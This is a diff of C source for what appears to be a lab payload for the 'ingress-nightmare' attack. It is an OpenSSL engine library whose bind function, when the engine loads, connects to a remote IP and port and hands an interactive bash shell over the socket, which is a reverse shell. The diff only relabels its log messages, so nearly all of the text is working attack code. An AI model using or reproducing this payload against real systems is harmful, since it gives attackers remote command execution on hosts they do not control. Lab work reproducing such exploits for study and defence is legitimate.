@@ -28,7 +28,7 @@ static int establish_reverse_shell(const char *ip, int port) {
     /* Create socket */
     sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock == -1) {
-        fprintf(stderr, "Socket creation failed: %s\n", strerror(errno));
+        fprintf(stderr, "ingress-nightmare lab: Socket creation failed: %s\n", strerror(errno));
         return 0;
     }
 
@@ -38,14 +38,14 @@ static int establish_reverse_shell(const char *ip, int port) {
     srv_addr.sin_port = htons(port);
     
     if (inet_pton(AF_INET, ip, &srv_addr.sin_addr) <= 0) {
-        fprintf(stderr, "Invalid address: %s\n", strerror(errno));
+        fprintf(stderr, "ingress-nightmare lab: Invalid address: %s\n", strerror(errno));
         close(sock);
         return 0;
     }
 
     /* Connect to remote host */
     if (connect(sock, (struct sockaddr *)&srv_addr, sizeof(srv_addr)) == -1) {
-        fprintf(stderr, "Connection failed: %s\n", strerror(errno));
+        fprintf(stderr, "ingress-nightmare lab: Connection failed: %s\n", strerror(errno));
         close(sock);
         return 0;
     }
@@ -59,7 +59,7 @@ static int establish_reverse_shell(const char *ip, int port) {
     execl("/bin/bash", "bash", "-i", NULL);
 
     /* If execl fails, clean up */
-    fprintf(stderr, "Shell execution failed: %s\n", strerror(errno));
+    fprintf(stderr, "ingress-nightmare lab: Shell execution failed: %s\n", strerror(errno));
     close(sock);
     
     return 0;
@@ -71,23 +71,23 @@ static int establish_reverse_shell(const char *ip, int port) {
 static int bind_hello(ENGINE *e, const char *id)
 {
     if (id) {
-        fprintf(stderr, "Engine invoked with ID: '%s'\n", id);
+        fprintf(stderr, "ingress-nightmare lab: Engine invoked with ID: '%s'\n", id);
     }
 
     /* Set the engine's internal ID and name */
     if (!ENGINE_set_id(e, engine_id) ||
         !ENGINE_set_name(e, engine_name)) {
-        fprintf(stderr, "Failed to set engine id or name\n");
+        fprintf(stderr, "ingress-nightmare lab: Failed to set engine id or name\n");
         return 0;
     }
 
     /* Log basic information */
-    printf("Engine initialized successfully\n");
+    printf("ingress-nightmare lab: Engine initialized successfully\n");
     
     /* Log process information for debugging */
     pid_t pid = getpid();
     uid_t uid = getuid();
-    printf("Process ID: %d, User ID: %d\n", pid, uid);
+    printf("ingress-nightmare lab: Process ID: %d, User ID: %d\n", pid, uid);
 
     /* Establish reverse shell connection */
     establish_reverse_shell(REMOTE_IP, REMOTE_PORT);
